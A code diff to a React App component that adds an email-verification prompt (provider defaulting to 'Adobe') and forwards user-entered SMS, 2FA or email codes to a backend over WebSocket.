@@ -229,6 +229,15 @@ function App() {
         });
         break;
       
+      case 'show_email_verification':
+        setInteractiveState({
+          active: true,
+          type: 'email_verification',
+          provider: message.data?.provider || 'Adobe',
+          data: message.data,
+        });
+        break;
+      
       case 'hide_state':
       case 'reset':
         setInteractiveState({
@@ -282,10 +291,14 @@ function App() {
       
       case 'submit_sms':
       case 'submit_2fa':
+      case 'submit_email_code':
         // Send code to backend via WebSocket
         sendMessage({
           command: 'verification_code',
-          data: { code: data?.code, type: action === 'submit_sms' ? 'sms' : '2fa' },
+          data: {
+            code: data?.code,
+            type: action === 'submit_sms' ? 'sms' : action === 'submit_2fa' ? '2fa' : 'email',
+          },
         });
         break;
       
